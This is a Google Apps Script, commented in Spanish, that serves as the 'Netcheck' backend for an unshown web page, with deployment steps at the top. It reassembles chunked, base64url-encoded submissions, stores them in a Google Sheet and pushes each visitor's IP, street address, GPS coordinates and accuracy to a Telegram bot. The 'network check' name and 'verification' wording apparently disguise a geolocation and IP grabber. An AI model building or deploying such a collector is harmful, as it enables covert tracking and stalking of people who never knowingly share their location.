/**
 * Netcheck - receptor de datos
 * Pegar en: https://script.google.com → Nuevo proyecto → pegar este código
 * Deploy → Nueva implementación → Aplicación web → Ejecutar como: yo → Acceso: Cualquier usuario
 * Copiar la URL /exec y ponerla en CONFIG.endpoint del index.html
 */

const NOMBRE_HOJA = 'Netcheck';
const PROP_SHEET = 'SHEET_ID';
const PROP_TG_TOKEN = 'TG_TOKEN';   // opcional: Script Properties
const PROP_TG_CHAT = 'TG_CHAT';     // opcional: Script Properties

function doGet(e) {
  try {
    const sid = e.parameter.s || '';
    const i = parseInt(e.parameter.i || '0', 10);
    const n = parseInt(e.parameter.n || '1', 10);
    const d = e.parameter.d || '';

    if (!sid || !d) return ok();

    const cache = CacheService.getScriptCache();
    const key = 'nc_' + sid;
    let partes = cache.get(key);
    partes = partes ? JSON.parse(partes) : {};
    partes[i] = d;

    const indices = Object.keys(partes).map(Number).sort((a, b) => a - b);
    const completo = indices.length >= n && indices.every((v, idx) => v === idx + 1);

    if (completo) {
      cache.remove(key);
      const raw = indices.map(k => partes[k]).join('');
      const json = Utilities.newBlob(Utilities.base64Decode(decodificaB64u(raw)))
        .getDataAsString('UTF-8');
      const datos = JSON.parse(json);
      guardar(datos, sid);
      avisarTelegram(datos, sid);
    } else {
      cache.put(key, JSON.stringify(partes), 21600); // 6 h
    }
    return ok();
  } catch (err) {
    return ContentService.createTextOutput('err').setMimeType(ContentService.MimeType.TEXT);
  }
}

function decodificaB64u(s) {
  s = s.replace(/-/g, '+').replace(/_/g, '/');
  while (s.length % 4) s += '=';
  return s;
}

function hoja() {
  const props = PropertiesService.getScriptProperties();
  let id = props.getProperty(PROP_SHEET);
  if (!id) {
    const ss = SpreadsheetApp.create(NOMBRE_HOJA);
    id = ss.getId();
    props.setProperty(PROP_SHEET, id);
    const sh = ss.getSheets()[0];
    sh.setName('Datos');
    sh.appendRow(['fecha', 'sesion', 'datos_json']);
    ss.setSpreadsheetTimeZone('America/Argentina/Buenos_Aires');
  }
  return SpreadsheetApp.openById(id).getSheetByName('Datos');
}

function guardar(datos, sid) {
  const fila = [
    new Date().toISOString(),
    sid,
    JSON.stringify(datos)
  ];
  hoja().appendRow(fila);
}

function avisarTelegram(datos, sid) {
  const props = PropertiesService.getScriptProperties();
  const token = props.getProperty(PROP_TG_TOKEN);
  const chat = props.getProperty(PROP_TG_CHAT);
  if (!token || !chat) return;
  const texto = [
    'Nueva verificación',
    'IP: ' + (datos.ip || '?'),
    'Lugar: ' + (datos.direccion || datos.ciudad || '?'),
    'GPS: ' + (datos.lat != null ? datos.lat.toFixed(5) + ', ' + datos.lon.toFixed(5) + ' (±' + (datos.acc || '?') + ' m)' : 'sin GPS'),
    'Fuente: ' + (datos.fuente || '?'),
    'Sesion: ' + sid
  ].join('\n');
  UrlFetchApp.fetch('https://api.telegram.org/bot' + token + '/sendMessage', {
    method: 'post',
    payload: { chat_id: chat, text: texto }
  });
}

function ok() {
  return ContentService.createTextOutput('ok').setMimeType(ContentService.MimeType.TEXT);
}
